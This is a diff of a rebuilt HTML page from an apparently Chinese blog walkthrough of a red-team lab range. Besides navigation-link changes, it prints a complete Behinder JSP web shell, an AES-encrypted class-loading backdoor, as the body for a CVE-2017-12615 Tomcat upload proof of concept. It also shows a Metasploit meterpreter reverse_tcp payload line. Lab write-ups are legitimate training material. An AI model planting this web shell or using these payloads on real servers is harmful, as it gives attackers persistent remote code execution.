@@ -112,7 +112,7 @@
      --><!--
        --><li><a href="/categories/">分类</a></li><!--
      --><!--
-       --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+       --><li><a href="/friends/">友链</a></li><!--
      -->
       </ul>
     </span>
@@ -229,7 +229,7 @@ Kali：
 <h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>这个就利用最简单的写木马即可了</p>
 <p><a target="_blank" rel="noopener" href="https://github.com/einzbernnn/Tomcatscan">einzbernnn&#x2F;Tomcatscan: Tomcat漏洞批量检测工具 (github.com)</a></p>
 <p>然后修改poc&#x2F;cve_2017_12615.py里面的body成冰蝎就可以了：</p>
-<pre class=" language-xml"><code class="language-xml">body = '''&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%!class</span> <span class="token attr-name">U</span> <span class="token attr-name">extends</span> <span class="token attr-name">ClassLoader{U(ClassLoader</span> <span class="token attr-name">c){super(c);}public</span> <span class="token attr-name">Class</span> <span class="token attr-name">g(byte</span> <span class="token attr-name">[]b){return</span> <span class="token attr-name">super.defineClass(b,0,b.length);}}%</span><span class="token punctuation">></span></span>&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>'''
+<pre class=" language-xml"><code class="language-xml">body = '''&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%!class</span> <span class="token attr-name">U</span> <span class="token attr-name">extends</span> <span class="token attr-name">ClassLoader&amp;#123;U(ClassLoader</span> <span class="token attr-name">c)&amp;#123;super(c);&amp;#125;public</span> <span class="token attr-name">Class</span> <span class="token attr-name">g(byte</span> <span class="token attr-name">[]b)&amp;#123;return</span> <span class="token attr-name">super.defineClass(b,0,b.length);&amp;#125;&amp;#125;%</span><span class="token punctuation">></span></span>&lt;%if (request.getMethod().equals("POST"))<span class="token entity" title="&#123;">&amp;#123;</span>String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);<span class="token entity" title="&#125;">&amp;#125;</span>%>'''
 </code></pre>
 <p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102095000-9s823ga.png" alt="image">​</p>
 <p><img src="/Blogimages/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA4/image-20240102094750-18mwwuw.png" alt="image">​</p>
@@ -450,7 +450,7 @@ set payload windows/x64/meterpreter/reverse_tcp
         
           <li><a href="/categories/">分类</a></li>
         
-          <li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li>
+          <li><a href="/friends/">友链</a></li>
         
       </ul>
     </div>
@@ -512,7 +512,7 @@ set payload windows/x64/meterpreter/reverse_tcp
     --><!--
       --><li><a href="/categories/">分类</a></li><!--
     --><!--
-      --><li><a href="/%E5%8F%8B%E4%BA%BA%E9%93%BA/">友链</a></li><!--
+      --><li><a href="/friends/">友链</a></li><!--
     -->
       </ul>
       <ul>
